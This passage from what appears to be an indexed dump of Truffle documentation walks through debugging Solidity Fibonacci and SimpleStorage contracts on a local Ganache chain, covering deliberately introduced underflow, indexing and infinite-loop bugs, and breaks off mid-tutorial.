sequence. Press Enter to repeat the last command, and step next to the next instruction: 9 : 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); ^^^^^^^^^ debug ( development : 0xf47f01da ...) > This instruction moves on to the initial seeding of the fibseries variable. Press v to see the current state of the variables: i : 0 n : 10 fibseries : [] Now we see three variables, our fibseries array and two others: i is an index variable, used to determine the location of the next number in the sequence n is the integer we passed to the function ( 10 in this case) indicating the number of entries in our Fibonacci sequence Here we see that n has been passed the value from the contract, while i hasn't received its value from the for loop yet, since we haven't gotten to that part of the function. Press Enter to step next to the next instruction: 9 : 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); ^ It's rather tedious to constantly press v after every state change. Thankfully, you can set certain variables to be \"watched\", so that they will display after every movement in the debugger. The syntax to watch a variable is +:<variable> . So let's watch the variables we care about ( i and fibseries ) with the following two commands: + : i + : fibseries After each command, the current value of the variable will display. But once done, we'll get a persistent display of the variables and their values. Press Enter to move to the next instruction: 9 : 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); ^^^^^^^^^^^^^^^^^ : i 0 : fibseries [] Notice that after the current instruction, the watched variables are displayed automatically. You can also watch expressions, not just variables. Run the following expression to make our output a little more compact. + :{ i , fibseries } This will output as follows: { i : 0 , fibseries : [] } Since we have all we need in this one expression, we can unwatch the individual variables. The syntax to watch a variable is -:<variable> . - : i - : fibseries Now we'll only be watching the single expression comprising the two variables. Press Enter to move to the next instruction and see the output: 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); 12 : fibseries . push ( 1 ); ^^^^^^^^^ :{ i , fibseries } { i : 0 , fibseries : [ 1 ] } Notice that we have now populated the first entry in the sequence. Because the debugger steps through each instruction one at a time, it's going to take a long time to see results if we don't pick up our pace. Luckily, the debugger can \"step over\", which steps over the current line, moving to the next line, as long as it's at the same function depth. This will allow us to make progress much more quickly. So type o to step over the current instruction set. The output will be: 13 : 14 : // generate subsequent entries 15 : for ( uint i = 2 ; i < n ; i ++ ) { ^ :{ i , fibseries } { i : 0 , fibseries : [ 1 , 1 ] } Here we see that we have populated the first two entries in the sequence. Since Enter will replay the previous command, press Enter now to step over again: 14 : // generate subsequent entries 15 : for ( uint i = 2 ; i < n ; i ++ ) { 16 : fibseries . push ( fibseries [ i - 1 ] + fibseries [ i - 2 ]); ^^^^^^^^^ :{ i , fibseries } { i : 2 , fibseries : [ 1 , 1 ] } Now that we have two entries in our sequence, we've moved into our for loop. Continue pressing Enter and watching the variable output. You should notice that when i gets to 10 , the for loop ends (as the loop terminates at i < n ). The final array is: [ 1 , 1 , 2 , 3 , 5 , 8 , 13 , 21 , 34 , 55 ] It can be verified that this is the correct first ten entries in the Fibonacci sequence. Debugging unexpected output \u00b6 Our contract as we have created it is working as expected. That's great, but we can't always get so lucky. Sometimes a contract appears to work fine (no errors are thrown) but the output is not what you'd expect. Let's examine that here. It's amazing what switching a plus sign for a minus sign can do. Instead of the Fibonacci sequence: F [ 1 ] = 1 F [ 2 ] = 1 F [ n ] = F [ n - 1 ] + F [ n - 2 ] Let's switch the plus for a minus sign: F [ 1 ] = 1 F [ 2 ] = 1 F [ n ] = F [ n - 1 ] - F [ n - 2 ] (I don't know if this series has a name, so we'll just call it the \"Trufflenacci\" sequence.) Let's edit our contract and see what happens. Open the Fibonacci.sol file. Edit the definition of our fibseries[] array to be of type uint8[] . uint8 [] fibseries ; Note : A `uint8` is an unsigned integer with 8 bits, with a maximum value of 2^8 = 255. Compare this to a `uint`, which is a 256 bit number with a maximum value of 2^256. Edit the for loop so that the terms are subtracted instead of added: fibseries . push ( fibseries [ i - 1 ] - fibseries [ i - 2 ]); Save this file. Back on the console, recompile the contract. compile --all Note : The `--all` flag with force recompile all of the contracts. Remigrate the contract to the blockchain. migrate --reset We can now run the same command as before, which will generate a new transaction: javascript Fibonacci.deployed().then(function(instance){return instance.generateFib(10);}); As before, the output of the console will be the transaction details. Note the transaction hash (the value of tx: ). Type debug and then the value of tx: found in your transaction details. This will enter the debugger again. Fibonacci . sol : 1 : pragma solidity ^ 0.4.22 ; 2 : 3 : contract Fibonacci { ^^^^^^^^^^^^^^^^^^^^ We're curious about what our fibseries array is going to look like, so let's watch it: + : fibseries The response will be undefined , because we haven't yet gotten to the point in the code where that array was defined. Let's \"step over\" execution, so as to speed things up (\"step next\" takes much longer, as it's a more granular process). You can \"step over\" by running the o command. Fibonacci . sol : 6 : 7 : // n = how many in the series to return 8 : function generateFib ( uint n ) public { ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ : fibseries [] The array is defined, but is still empty. Since Enter repeats the previous command (in our case, \"step over\"), press Enter twice. You'll see that the first element of fibseries has been populated. 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); 12 : fibseries . push ( 1 ); ^^^^^^^^^ : fibseries [ 1 ] Keep pressing Enter until four elements have been populated: : fibseries [ 1 , 1 , 0 , 255 ] Something seems off here. Obviously, if you were expecting the Fibonacci series, by this point you would realize that you had veered far off course. But the jump from 0 to 255 should be suspicious too. And in fact, what we're seeing is a buffer underflow , a situation where we have an unsigned integer , which can hold only positive values, being set to less than zero. Specifically, that fourth value is defined as the difference between the previous two elements, so 0 - 1 = -1 . Our type is uint8[] which means that each integer in the array is defined by 8 bits, so its maximum value is 2^8 - 1 = 255. Subtract one from zero, and the value \"wraps around\" to its maximum value. Assuming this was the series we wanted (and that our minus sign was correct), the way to change this is to change the definition of our fibseries array from uint8[] to int8[] . That would make values \"signed integers\" and able to accept negative values, giving you an array that would look like this instead: [ 1 , 1 , 0 , - 1 ] Debugging errors \u00b6 Sometimes, contracts have errors in them. They may compile just fine, but when you go to use them, problems arise. This is one of the reasons to use Ganache over a public testnet: you can easily redeploy a contract without any penalty in time or ether. So we're going to introduce a small error, a misnumbering in our for loop that will cause it to have an invalid index. Open the Fibonacci.sol file again. Edit the for loop so that the i variable starts from 1 for ( uint i = 1 ; i < n ; i ++ ) { Save this file. Back on the console, recompile the contract. compile --all Remigrate the contract to the blockchain. migrate --reset Run the same command as before: Fibonacci . deployed (). then ( function ( instance ){ return instance . generateFib ( 10 );}); You'll see an error, which will start with this: Error: VM Exception while processing transaction: invalid opcode Well that's not good. Moreover, the output didn't give us a transaction ID to debug, so we're going to need to look elsewhere for it. Thankfully, Ganache can tell us the transaction information. Go back in Ganache and click the \"Logs\" link at the top: Click this button to open the logs At the very bottom of the logs, you will see a transaction ID listed near an error saying invalid opcode . This is the one we need. Copy this transaction ID. Ganache logs Back in the console, type debug and paste in the transaction ID. This will enter the debugger again. Let's watch the same compacted expression as before, showing both the value of i and the value of fibseries . + :{ i , fibseries } Continually step next. You will eventually reach a state where the debugger will error out. 14 : // generate subsequent entries 15 : for ( uint i = 1 ; i < n ; i ++ ) { 16 : fibseries . push ( fibseries [ i - 1 ] - fibseries [ i - 2 ]); ^^^^^^^^^^^^^^ :{ i , fibseries } { i : 1 , fibseries : [ 1 , 1 ] } debug ( development : 0x948da9db ...) > Transaction halted with a RUNTIME ERROR . This is likely due to an intentional halting expression , like assert (), require () or revert (). It can also be due to out - of - gas exceptions . Please inspect your transaction parameters and contract code to determine the meaning of this error . Note that the contract is failing at the point where it tries to determine the value of fibseries[i-2] But in our debugger, we know that the current value of i is 1 , so i-2 is going to be -1 (or actually 2^256 - 1 , due to the buffer underflow issue we talked about above, and with i defined as a uint ). Since either one of those values are invalid (you can't have a negative index, and the value at index 2^256 - 1 is clearly not defined), the contract halts with an error. These are just some of the ways that you can use variable inspection to debug your contracts. We're constantly adding functionality of the debugger, so please raise an issue on our Github page or ask a fellow Truffler in our community Gitter channel . Happy debugging!","title":"Variable Inspection - Going Deeper with the Truffle Solidity Debugger"},{"location":"guides/debugger-variable-inspection/index.html#a-basic-smart-contract","text":"The Fibonacci sequence is an integer sequence where each successive number in the sequence is the sum of the two previous numbers. With the first two numbers set to 1, you can determine every number in the sequence through iteration. The Fibonacci sequence is related to the \"golden ratio\", which is found in certain areas of nature, such as governing the the arrangement of leaves on branches and petals on flowers. The golden ratio in nature: flower petals. (Source: Flickr ) Generating the Fibonacci sequence with a smart contract can show off the debugger and its variable inspection without getting too bogged down in details. Let's do it. Create a new project directory called fibonacci and change into it. mkdir fibonacci cd fibonacci Create a bare truffle project: truffle init In the contracts/ directory, create a file named Fibonacci.sol and add the following content: pragma solidity ^ 0.4.22 ; contract Fibonacci { uint [] fibseries ; // n = how many in the series to return function generateFib ( uint n ) public { // set 1st and 2nd entries fibseries . push ( 1 ); fibseries . push ( 1 ); // generate subsequent entries for ( uint i = 2 ; i < n ; i ++ ) { fibseries . push ( fibseries [ i - 1 ] + fibseries [ i - 2 ]); } } } Let's take a look at this contract to see what's going on with it: First, we see the standard pragma declaration, which states that the contract s compatible with any 0.4.x version of Solidity newer than 0.4.22. The contract name is called Fibonacci . We're defining an array of integers called fibseries . This will house our Fibonacci series. Note that the variable declaration is happening outside of any function, and therefore the array will be saved in storage (instead of memory), provoking a transaction to occur when the contract is run. The function is called generateFib and takes a single argument, which is the number of integers in the sequence to generate. The next two commands add an element each to the array via the .push() method. As we know our fibseries array is defined in storage, but size isn't known until runtime, the .push() method is used to add entries to (the end of) our array. This starts the sequence with the number 1 twice. The for loop iterates through the rest of the array (as determined by the integer n ) filling each entry with the appropriate value. Inside the migrations/ directory of your project, create a file called 2_deploy_contracts.js and populate it with the following content: var Fibonacci = artifacts . require ( \"Fibonacci\" ); module . exports = function ( deployer ) { deployer . deploy ( Fibonacci ); }; This file allows us to deploy the Fibonacci contract (shown above) to the blockchain. Now launch Ganache . This will be the personal blockchain we'll use to deploy our contract. Ganache Note : You can also run this tutorial with [Truffle Develop](/docs/getting_started/console) and the results will be the same. In the root of your project, open your truffle.js file and add the following content: module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 7545 , network_id : \"*\" } } }; This allows us to connect our project to Ganache. Launch the Truffle console : truffle console You will see a prompt: truffle ( development ) > We'll run all of our commands from here. Compile the contract: compile You should see the following output: Compiling .\\contracts\\Fibonacci.sol... Compiling .\\contracts\\Migrations.sol... Writing artifacts to .\\build\\contracts Note : Make sure to examine the output for any errors or warnings. Migrate the contract to our blockchain. migrate You will see output that looks like this, though the addresses and transaction IDs will be different: Using network 'development'. Running migration: 1_initial_migration.js Replacing Migrations... ... 0xd29465deee7a5d60aed89520807432ef8a2fbbb665611882277ec8ca6fc9c622 Migrations: 0x5cc77b19b8e14e4d6074562bdbe1e13e1b793693 Saving successful migration to network... ... 0xba700ad46880ab2a9bdd961e66c9313fc541f91c439243df6ab2b97920cf2c4a Saving artifacts... Running migration: 2_deploy_contracts.js Replacing Fibonacci... ... 0xed0d1b736e948d926ee31f959b013f67d71e08f294a87e86e41ccbd8a62ce908 Fibonacci: 0xa3f4063ffbdc5cfd8ecbd99424378a5f056eb81d Saving successful migration to network... ... 0xcaeb44f5e28689c29cb3189c7b42fa1094021b4e5008f720fef2f9b867e6be23 Saving artifacts...","title":"A basic smart contract"},{"location":"guides/debugger-variable-inspection/index.html#interacting-with-the-basic-smart-contract","text":"Our contract is now on the blockchain. Ganache has automatically mined the transactions that came from the contract call and creation, as you can see by clicking the \"Transactions\" button in Ganache: Ganache transactions Now it's time to interact with the contract. First we'll check to make sure that it's working correctly. In the Truffle console, enter the following command: Fibonacci . deployed (). then ( function ( instance ){ return instance . generateFib ( 10 );}); Before we run the command, let's take a look at it in greater detail. Displayed in a more easily-readable manner, it reads: Fibonacci . deployed (). then ( function ( instance ) { return instance . generateFib ( 10 ); }); This command uses JavaScript promises . Specifically, the command says that given a deployed version of the Fibonacci contract, run an instance of that contract, and then run the generateFib function from that contract, passing it the argument 10 . Run the above command. A transaction will be created on the blockchain because our array that holds the generated Fibonacci sequence is in storage. Because of this, the output of the console will be the transaction details, which will look similar to this: { tx : '0xf47f01da1a6991f4dc168928cf4c490cb9bb57ca403b428f40a333ea65d1c41c' , receipt : { transactionHash : '0xf47f01da1a6991f4dc168928cf4c490cb9bb57ca403b428f40a333ea65d1c41c' , transactionIndex : 0 , blockHash : '0x88d45cb84d1f26001b0e7ae2931a56dfc0a592a1d0437fe0a37540d65f49a2ed' , blockNumber : 5 , gasUsed : 298373 , cumulativeGasUsed : 298373 , contractAddress : null , logs : [], status : '0x01' , logsBloom : '0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' }, logs : [] } The important part of this output for us is the transaction ID (listed as the value of tx: ). Because even though we've run our function, we don't actually know what happened. Did it work correctly? Did something unexpected happen? We'll need the Truffle Solidity debugger to find out. Note : Your transaction ID will be different from the above.","title":"Interacting with the basic smart contract"},{"location":"guides/debugger-variable-inspection/index.html#debugging-a-transaction","text":"You can debug a transaction in the Truffle console by typing debug <transactionID> . We'll now do just that. Type debug and then the value of tx: found in your transaction details. For example: debug 0xf47f01da1a6991f4dc168928cf4c490cb9bb57ca403b428f40a333ea65d1c41c Note : Your transaction ID will be different. Do not copy the above example exactly. This will enter the debugger. You will see the following output: Gathering transaction data ... Addresses affected : 0x33b217190208f7b8d2b14d7a30ec3de7bd722ac6 - Fibonacci Commands : ( enter ) last command entered ( step next ) ( o ) step over , ( i ) step into , ( u ) step out , ( n ) step next (;) step instruction , ( p ) print instruction , ( h ) print this help , ( q ) quit ( b ) toggle breakpoint , ( c ) continue until breakpoint ( + ) add watch expression ( ` + : < expr > ` ), ( - ) remove watch expression ( - : < expr > ) ( ? ) list existing watch expressions ( v ) print variables and values , (:) evaluate expression - see ` v ` Fibonacci . sol : 1 : pragma solidity ^ 0.4.22 ; 2 : 3 : contract Fibonacci { ^^^^^^^^^^^^^^^^^^^^ debug ( development : 0xf47f01da ...) > Let's examine what's going on here. The debugger names the address of the contract in question that is related to the transaction, as well as the name of that contract. In our case, we're only dealing with a single contract, though if our transaction dealt with multiple contracts, all addresses would be shown. A full list of commands for the debugger is shown. Many of these mirror other code debuggers. We'll use a few of these throughout the tutorial, but if you ever want to see the list again, type h . The debugger starts at the first instruction of the transaction, and shows you the relevant code for that instruction, highlighted with carets ( ^^^ ). Type n and <Enter> to step next. This will move to the next instruction: 6 : 7 : // n = how many in the series to return 8 : function generateFib ( uint n ) public { ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ debug ( development : 0xf47f01da ...) > We've seen in the previous tutorial on debugging how you can step through the instructions to debug your contract. But here, we have an additional concern, which is that we don't actually know the outcome of our function call; we want to know what a variable is set to. You can view the state of all known variables by pressing v : fibseries : [] debug ( development : 0xf47f01da ...) > Here we see one empty array. The arry fibseries will have the n numbers in the Fibonacci sequence. Press Enter to repeat the last command, and step next to the next instruction: 9 : 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); ^^^^^^^^^ debug ( development : 0xf47f01da ...) > This instruction moves on to the initial seeding of the fibseries variable. Press v to see the current state of the variables: i : 0 n : 10 fibseries : [] Now we see three variables, our fibseries array and two others: i is an index variable, used to determine the location of the next number in the sequence n is the integer we passed to the function ( 10 in this case) indicating the number of entries in our Fibonacci sequence Here we see that n has been passed the value from the contract, while i hasn't received its value from the for loop yet, since we haven't gotten to that part of the function. Press Enter to step next to the next instruction: 9 : 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); ^ It's rather tedious to constantly press v after every state change. Thankfully, you can set certain variables to be \"watched\", so that they will display after every movement in the debugger. The syntax to watch a variable is +:<variable> . So let's watch the variables we care about ( i and fibseries ) with the following two commands: + : i + : fibseries After each command, the current value of the variable will display. But once done, we'll get a persistent display of the variables and their values. Press Enter to move to the next instruction: 9 : 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); ^^^^^^^^^^^^^^^^^ : i 0 : fibseries [] Notice that after the current instruction, the watched variables are displayed automatically. You can also watch expressions, not just variables. Run the following expression to make our output a little more compact. + :{ i , fibseries } This will output as follows: { i : 0 , fibseries : [] } Since we have all we need in this one expression, we can unwatch the individual variables. The syntax to watch a variable is -:<variable> . - : i - : fibseries Now we'll only be watching the single expression comprising the two variables. Press Enter to move to the next instruction and see the output: 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); 12 : fibseries . push ( 1 ); ^^^^^^^^^ :{ i , fibseries } { i : 0 , fibseries : [ 1 ] } Notice that we have now populated the first entry in the sequence. Because the debugger steps through each instruction one at a time, it's going to take a long time to see results if we don't pick up our pace. Luckily, the debugger can \"step over\", which steps over the current line, moving to the next line, as long as it's at the same function depth. This will allow us to make progress much more quickly. So type o to step over the current instruction set. The output will be: 13 : 14 : // generate subsequent entries 15 : for ( uint i = 2 ; i < n ; i ++ ) { ^ :{ i , fibseries } { i : 0 , fibseries : [ 1 , 1 ] } Here we see that we have populated the first two entries in the sequence. Since Enter will replay the previous command, press Enter now to step over again: 14 : // generate subsequent entries 15 : for ( uint i = 2 ; i < n ; i ++ ) { 16 : fibseries . push ( fibseries [ i - 1 ] + fibseries [ i - 2 ]); ^^^^^^^^^ :{ i , fibseries } { i : 2 , fibseries : [ 1 , 1 ] } Now that we have two entries in our sequence, we've moved into our for loop. Continue pressing Enter and watching the variable output. You should notice that when i gets to 10 , the for loop ends (as the loop terminates at i < n ). The final array is: [ 1 , 1 , 2 , 3 , 5 , 8 , 13 , 21 , 34 , 55 ] It can be verified that this is the correct first ten entries in the Fibonacci sequence.","title":"Debugging a transaction"},{"location":"guides/debugger-variable-inspection/index.html#debugging-unexpected-output","text":"Our contract as we have created it is working as expected. That's great, but we can't always get so lucky. Sometimes a contract appears to work fine (no errors are thrown) but the output is not what you'd expect. Let's examine that here. It's amazing what switching a plus sign for a minus sign can do. Instead of the Fibonacci sequence: F [ 1 ] = 1 F [ 2 ] = 1 F [ n ] = F [ n - 1 ] + F [ n - 2 ] Let's switch the plus for a minus sign: F [ 1 ] = 1 F [ 2 ] = 1 F [ n ] = F [ n - 1 ] - F [ n - 2 ] (I don't know if this series has a name, so we'll just call it the \"Trufflenacci\" sequence.) Let's edit our contract and see what happens. Open the Fibonacci.sol file. Edit the definition of our fibseries[] array to be of type uint8[] . uint8 [] fibseries ; Note : A `uint8` is an unsigned integer with 8 bits, with a maximum value of 2^8 = 255. Compare this to a `uint`, which is a 256 bit number with a maximum value of 2^256. Edit the for loop so that the terms are subtracted instead of added: fibseries . push ( fibseries [ i - 1 ] - fibseries [ i - 2 ]); Save this file. Back on the console, recompile the contract. compile --all Note : The `--all` flag with force recompile all of the contracts. Remigrate the contract to the blockchain. migrate --reset We can now run the same command as before, which will generate a new transaction: javascript Fibonacci.deployed().then(function(instance){return instance.generateFib(10);}); As before, the output of the console will be the transaction details. Note the transaction hash (the value of tx: ). Type debug and then the value of tx: found in your transaction details. This will enter the debugger again. Fibonacci . sol : 1 : pragma solidity ^ 0.4.22 ; 2 : 3 : contract Fibonacci { ^^^^^^^^^^^^^^^^^^^^ We're curious about what our fibseries array is going to look like, so let's watch it: + : fibseries The response will be undefined , because we haven't yet gotten to the point in the code where that array was defined. Let's \"step over\" execution, so as to speed things up (\"step next\" takes much longer, as it's a more granular process). You can \"step over\" by running the o command. Fibonacci . sol : 6 : 7 : // n = how many in the series to return 8 : function generateFib ( uint n ) public { ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ : fibseries [] The array is defined, but is still empty. Since Enter repeats the previous command (in our case, \"step over\"), press Enter twice. You'll see that the first element of fibseries has been populated. 10 : // set 1st and 2nd entries 11 : fibseries . push ( 1 ); 12 : fibseries . push ( 1 ); ^^^^^^^^^ : fibseries [ 1 ] Keep pressing Enter until four elements have been populated: : fibseries [ 1 , 1 , 0 , 255 ] Something seems off here. Obviously, if you were expecting the Fibonacci series, by this point you would realize that you had veered far off course. But the jump from 0 to 255 should be suspicious too. And in fact, what we're seeing is a buffer underflow , a situation where we have an unsigned integer , which can hold only positive values, being set to less than zero. Specifically, that fourth value is defined as the difference between the previous two elements, so 0 - 1 = -1 . Our type is uint8[] which means that each integer in the array is defined by 8 bits, so its maximum value is 2^8 - 1 = 255. Subtract one from zero, and the value \"wraps around\" to its maximum value. Assuming this was the series we wanted (and that our minus sign was correct), the way to change this is to change the definition of our fibseries array from uint8[] to int8[] . That would make values \"signed integers\" and able to accept negative values, giving you an array that would look like this instead: [ 1 , 1 , 0 , - 1 ]","title":"Debugging unexpected output"},{"location":"guides/debugger-variable-inspection/index.html#debugging-errors","text":"Sometimes, contracts have errors in them. They may compile just fine, but when you go to use them, problems arise. This is one of the reasons to use Ganache over a public testnet: you can easily redeploy a contract without any penalty in time or ether. So we're going to introduce a small error, a misnumbering in our for loop that will cause it to have an invalid index. Open the Fibonacci.sol file again. Edit the for loop so that the i variable starts from 1 for ( uint i = 1 ; i < n ; i ++ ) { Save this file. Back on the console, recompile the contract. compile --all Remigrate the contract to the blockchain. migrate --reset Run the same command as before: Fibonacci . deployed (). then ( function ( instance ){ return instance . generateFib ( 10 );}); You'll see an error, which will start with this: Error: VM Exception while processing transaction: invalid opcode Well that's not good. Moreover, the output didn't give us a transaction ID to debug, so we're going to need to look elsewhere for it. Thankfully, Ganache can tell us the transaction information. Go back in Ganache and click the \"Logs\" link at the top: Click this button to open the logs At the very bottom of the logs, you will see a transaction ID listed near an error saying invalid opcode . This is the one we need. Copy this transaction ID. Ganache logs Back in the console, type debug and paste in the transaction ID. This will enter the debugger again. Let's watch the same compacted expression as before, showing both the value of i and the value of fibseries . + :{ i , fibseries } Continually step next. You will eventually reach a state where the debugger will error out. 14 : // generate subsequent entries 15 : for ( uint i = 1 ; i < n ; i ++ ) { 16 : fibseries . push ( fibseries [ i - 1 ] - fibseries [ i - 2 ]); ^^^^^^^^^^^^^^ :{ i , fibseries } { i : 1 , fibseries : [ 1 , 1 ] } debug ( development : 0x948da9db ...) > Transaction halted with a RUNTIME ERROR . This is likely due to an intentional halting expression , like assert (), require () or revert (). It can also be due to out - of - gas exceptions . Please inspect your transaction parameters and contract code to determine the meaning of this error . Note that the contract is failing at the point where it tries to determine the value of fibseries[i-2] But in our debugger, we know that the current value of i is 1 , so i-2 is going to be -1 (or actually 2^256 - 1 , due to the buffer underflow issue we talked about above, and with i defined as a uint ). Since either one of those values are invalid (you can't have a negative index, and the value at index 2^256 - 1 is clearly not defined), the contract halts with an error. These are just some of the ways that you can use variable inspection to debug your contracts. We're constantly adding functionality of the debugger, so please raise an issue on our Github page or ask a fellow Truffler in our community Gitter channel . Happy debugging!","title":"Debugging errors"},{"location":"guides/debugging-a-smart-contract/index.html","text":"Note : This tutorial requires Truffle version 4.0 or newer. A smart contract in Ethereum is just code. Unlike the \"paper\" contracts that you find elsewhere, this contract needs to make sense in a very precise manner. (And that's a good thing. Imagine how much clearer real-world contracts would be if they needed to \"compile\"?) If our contracts are not coded correctly, our transactions may fail, which can result in the loss of ether (in the form of gas), not to mention wasted time and effort. Luckily, Truffle (as of version 4) has a built in debugger for stepping through your code. So when something goes wrong, you can find out exactly what it was, and fix it promptly. In this tutorial, we will migrate a basic contract to a test blockchain, introduce some errors into it, and solve each one through the use of the built-in Truffle debugger. A basic smart contract \u00b6 One of the most basic, non-trivial, types of smart contract is a simple storage contract . (This example was adapted from the Solidity documentation .) pragma solidity ^ 0.4.17 ; contract SimpleStorage { uint myVariable ; function set ( uint x ) public { myVariable = x ; } function get () constant public returns ( uint ) { return myVariable ; } } This contract does two things: Allows you to set a variable ( myVariable ) to a particular integer value Allows you to query that variable to get the selected value This isn't a very interesting contract, but that's not the point here. We want to see what happens when things go wrong. First, let's set up our environment. Deploying the basic smart contract \u00b6 Create a new directory where we will house our contract locally: mkdir simple-storage cd simple-storage Create a bare Truffle project: truffle init This will create directories such as contracts/ and migrations/ , and populate them with files we will use when we deploy our contract to the blockchain. Inside the contracts/ directory, create a file called Store.sol with the following content: pragma solidity ^ 0.4.17 ; contract SimpleStorage { uint myVariable ; function set ( uint x ) public { myVariable = x ; } function get () constant public returns ( uint ) { return myVariable ; } } This is the contract that we will be debugging. While the full details of this file are beyond the scope of this tutorial, note that there is a contract named SimpleStorage that contains a numeric variable myVariable and two functions: set() and get() . The first function stores a value in that variable and the second queries that value. Inside the migrations/ directory, create a file called 2_deploy_contracts.js and populate it with the following content: var SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = function ( deployer ) { deployer . deploy ( SimpleStorage ); }; This file is the directive that allows us to deploy the SimpleStorage contract to the blockchain. On the terminal, compile the smart contract: truffle compile Open a second terminal and run truffle develop to start a development blockchain built directly into Truffle that we can use to test our contract: truffle develop The console will display a prompt truffle(develop)> . From here, unless otherwise specified, all commands will be typed on this prompt. With the develop console up and running, we can now deploy our contracts to the blockchain by running our migrations: migrate The response should look something like below, though the specific IDs will differ: Running migration: 1_initial_migration.js Replacing Migrations... ... 0xe4f911d95904c808a81f28de1e70a377968608348b627a66efa60077a900fb4c Migrations: 0x3ed10fd31b3fbb2c262e6ab074dd3c684b8aa06b Saving successful migration to network... ... 0x429a40ee574664a48753a33ea0c103fc78c5ca7750961d567d518ff7a31eefda Saving artifacts... Running migration: 2_deploy_contracts.js Replacing SimpleStorage... ... 0x6783341ba67d5c0415daa647513771f14cb8a3103cc5c15dab61e86a7ab0cfd2 SimpleStorage: 0x377bbcae5327695b32a1784e0e13bedc8e078c9c Saving successful migration to network... ... 0x6e25158c01a403d33079db641cb4d46b6245fd2e9196093d9e5984e45d64a866 Saving artifacts... Interacting with the basic smart contract \u00b6 The smart contract is now deployed to a test network via truffle develop , which launches a console against Ganache , a local development blockchain built right into Truffle. We next want to interact with the smart contract to see how it works when working correctly. We'll interact using the truffle develop console. Note : If you're wondering why we didn't need to mine to get the transaction to be secured, the Truffle Develop console already takes care of that for us. If using a different network, you'll need to make sure you mine to get the transaction on the blockchain. In the console where truffle develop is running, run the following command: SimpleStorage . deployed (). then ( function ( instance ){ return instance . get . call ();}). then ( function ( value ){ return value . toNumber ()}); This command looks at the SimpleStorage contract, and then calls the get() function as defined inside it. It then returns the output, which is usually rendered as a string, and converts it to a number: 0 This shows us that our variable, myVariable , is set to 0 , even though we haven't set this variable to any value (yet). This is because variables with integer types are automatically populated with the value of zero in Solidity , unlike other languages where it might be NULL or undefined . Now let's run a transaction on our contract. We'll do this by running the set() function, where we can set our variable value to some other integer. Run the following command: SimpleStorage . deployed (). then ( function ( instance ){ return instance . set ( 4 );}); This sets the variable to 4 . The output shows some information about the transaction, including the transaction ID (hash), transaction receipt, and any event logs that were triggered during the course of the transaction: { tx : '0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42' , receipt : { transactionHash : '0x7f799ad56584199db36bd617b77cc1d825ff18714e80da9d2d5a0a9fff5b4d42' , transactionIndex : 0 , blockHash : '0x60adbf0523622dc1be52c627f37644ce0a343c8e7c8955b34c5a592da7d7c651' , blockNumber : 5 , gasUsed : 41577 , cumulativeGasUsed : 41577 , contractAddress : null , logs : [] }, logs : [] } Most important to us is the transaction ID (listed here both as tx and as transactionHash ). We'll need to copy that value when we start to debug. Note : Your transaction IDs will likely be different from what is listed here. To verify that the variable has changed values, run the get() function again: SimpleStorage . deployed (). then ( function ( instance ){ return instance . get . call ();}). then ( function ( value ){ return value . toNumber ()}); The output should look like this: 4 Debugging errors \u00b6 The above shows how the contract should work. Now, we will introduce some small errors to the contract and redeploy it. We will see how the issues present itself, and also use Truffle's built-in debug feature to fix the issues . We will look at the following issues: An infinite loop Invalid error check No error, but a function isn't operating as desired Issue #1: An infinite loop \u00b6 On the Ethereum blockchain, transactions cannot be set to run forever. A transaction can run up until its gas limit is reached. Once that happens, the transaction will error out, and an \"out of gas\" error will be returned. Since gas is priced in ether, this could have real-world financial implications. So fixing an out-of-gas error is critical. Introducing the error \u00b6 An infinite loop is easy to create. Open Store.sol from the contracts/ directory in a text editor. Replace the set() function with the following: function set ( uint x ) public { while ( true ) { myVariable = x ; } } This function will never terminate, because of the while(true) conditional. Testing the contract \u00b6 The Truffle Develop console has the ability to migrate updated contracts without the need to exit and restart the console. And since the migrate command can compile and migrate in one step, we can reset our contract on the blockchain in one step. In the Truffle Develop console, update the contract: migrate --reset You will see both the compiler output and the migration output. In order to facilitate error hunting, we will open a second console with logging. This will allow us to, for example, see transaction IDs when a transaction fails. In another terminal window, run the following command: truffle develop --log Leave that window for now and return to the first console. Now we are ready to run that transaction. Run the set() command from above. SimpleStorage . deployed (). then ( function ( instance ){ return instance . set ( 4 );}); An error will display: Error: VM Exception while processing transaction: out of gas Moreover, in the console with the logs, you will see more information: develop:testrpc eth_sendTransaction +0ms develop:testrpc +1s develop:testrpc Transaction: 0xe493340792ab92b95ac40e43dca6bc88fba7fd67191989d59ca30f79320e883f +2ms develop:testrpc Gas usage: 4712388 +11ms develop:testrpc Block Number: 6 +15ms develop:testrpc Runtime Error: out of gas +0ms develop:testrpc +16ms With our failure and our transaction ID, we can now debug the transaction. Debugging the issue \u00b6 Truffle contains a built-in debugger. The command to launch this is debug <Transaction ID> from the Truffle Develop console, or truffle debug <Transaction ID> from the terminal. Let's launch this now. In the Truffle Develop console, copy the transaction ID from the logs console and paste it as the argument in the debug command: debug 0xe493340792ab92b95ac40e43dca6bc88fba7fd67191989d59ca30f79320e883f Note : Again, your transaction ID will be different from what is listed here. You will see the following output: Gathering transaction data ... Addresses affected : 0x377bbcae5327695b32a1784e0e13bedc8e078c9c - SimpleStorage Commands : ( enter ) last command entered ( step next ) ( o ) step over , ( i ) step into , ( u ) step out , ( n ) step next (;) step instruction , ( p ) print instruction , ( h ) print this help , ( q ) quit Store . sol | 0x377bbcae5327695b32a1784e0e13bedc8e078c9c : 1 